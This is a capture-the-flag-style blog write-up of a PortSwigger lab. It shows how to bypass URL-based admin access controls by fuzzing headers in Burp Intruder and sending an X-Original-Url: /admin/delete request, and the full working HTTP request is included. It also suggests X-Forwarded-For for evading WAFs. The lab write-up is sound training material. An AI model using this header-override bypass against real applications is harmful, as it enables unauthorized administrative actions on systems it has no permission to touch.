---
title: "Authentication Bypass By Abusing URL Based Controls [Portwigger Practitioner Series]"
date: 2024-08-23 20:00:56 +0300
categories: [Web Security, web]
tags: [web, hacking, authentication bypass]
image: /assets/img/auth/auth.png
alt: "Authentication Bypass By Abusing URL Based Controls [Portwigger Practitioner Series]"
---
The first post of the portswigger practitioner series. My attempt at solving the practitioner labs without the provided solutions. My solutions will be after a couple of tests, only documenting what worked. 

## Let me in, admin.
- Accessing the URL lands us here. 
![here](/assets/img/auth/landing1.png)
- Clicking on the *Admin Panel* reveals the access denied error. We need to bypass this.
![headers](/assets/img/auth/access-denied1.png)
- After some few tries, i noticed some headers that were allowed by the application. Using the list from my favourite header fuzzing list [here](https://gist.github.com/kaimi-/6b3c99538dce9e3d29ad647b325007c1). Replace the `127.0.0.1` with the protected path `/admin`. Also remove the /admin in the GET request and set it to `GET / HTTP/1.1`. 
- Intercept the `/admin` endpoint using BurpSuite. Send to `Intruder`. Add the payloads from the url and start the scan. Set a new marker to indicate the position. I used `something: /admin`.
- Use the simple list and paste payloads.
- Fuzz the living string out of it till it begs for mercy. Remember to uncheck the URL encode these characters on the bottom of the intruder page.
![headers](/assets/img/auth/header-intruder.png)
- I noticed the `X-Original-Url` had a different content lenth than the rest. Observe the response.
![headers](/assets/img/auth/admin-resp.png)
- Set the path to `/?username=carlos` and the X-Original-Url set to `/admin/delete` and make the request. Success.
```text
GET /?username=carlos HTTP/1.1
Host: 0a71004004fccef481a8111800a50032.web-security-academy.net
Connection: close
sec-ch-ua: "Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Sec-Fetch-Site: same-origin
X-Original-Url: /admin/delete
```

- We get the response:
```html
<section id=notification-labsolved class=notification-labsolved-hidden>
        <div class=container>
            <h4>Congratulations, you solved the lab!</h4>
            <div>
                <span>
                    Share your skills!
                </span>
```
- Solved.

## Lesson learnt
- Always observe the headers. They may not always be visible when making requests, but may be supported and may be useful to bypass WAFs or authentication.
- For example the `X-Forwarded-For` header can be used to bypass common WAF defenses and authorizations.